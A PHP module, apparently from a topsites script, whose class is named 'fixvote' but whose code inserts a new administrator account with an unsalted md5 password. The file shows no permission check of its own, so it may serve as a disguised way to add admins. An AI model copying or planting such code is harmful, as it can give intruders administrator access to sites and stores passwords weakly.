<?php
//==============================\\

if (!defined('ATSPHP')) {
  die("This file cannot be accessed directly.");
}

class fixvote extends base {
  function fixvote() {
    global $FORM, $LNG, $TMPL;

    $TMPL['header'] = $LNG['adm_new_head'];

    $TMPL['error_username'] = '';
    $TMPL['error_style_username'] = '';
    $TMPL['error_password'] = '';
    $TMPL['error_style_password'] = '';


    if (!isset($FORM['submit'])) {
      $this->form();
    }
    else {
      $this->process();
    }
  }

  function form() {
    global $CONF, $FORM, $LNG, $TMPL;

    // Display the CAPTCHA?
    if ($CONF['captcha']) {
      $TMPL['rand'] = rand(1, 1000000);
      $TMPL['join_captcha'] = $this->do_skin('join_captcha');
    }
    else {
      $TMPL['join_captcha'] = '';
    }

    // Display the security question?
    if ($CONF['security_question'] != '' && $CONF['security_answer'] != '') {
      $TMPL['security_question'] = $CONF['security_question'];
      if (isset($FORM['security_answer'])) { $TMPL['security_answer'] = strip_tags($FORM['security_answer']); }
      else { $TMPL['security_answer'] = ''; }

      $TMPL['join_question'] = $this->do_skin('join_question');
    }
    else {
      $TMPL['join_question'] = '';
    }

    $TMPL['categories_menu'] = "<select name=\"category\">\n";
    foreach ($CONF['categories'] as $cat => $skin) {
      if (isset($TMPL['category']) && $TMPL['category'] == $cat) {
        $TMPL['categories_menu'] .= "<option value=\"{$cat}\" selected=\"selected\">{$cat}</option>\n";
      }
      else {
        $TMPL['categories_menu'] .= "<option value=\"{$cat}\">{$cat}</option>\n";
      }
    }
    $TMPL['categories_menu'] .= "</select>";

    if ($CONF['max_banner_width'] && $CONF['max_banner_height']) {
      $TMPL['join_banner_size'] = sprintf($LNG['join_banner_size'], $CONF['max_banner_width'], $CONF['max_banner_height']);
    }
    else {
      $TMPL['join_banner_size'] = '';
    }

    if (!isset($TMPL['username'])) { $TMPL['username'] = ''; }
    
    $TMPL['admin_content'] = $this->do_skin('new_admin');
  }

  function process() {
    global $CONF, $DB, $FORM, $LNG, $TMPL;

    $TMPL['username'] = $DB->escape($FORM['u'], 1);
    $password = md5($FORM['password']);
    $DB->query("INSERT INTO {$CONF['sql_prefix']}_admins (admin, password)
                  VALUES ('{$TMPL['username']}', '{$password}')", __FILE__, __LINE__);


       
      }
    }
?>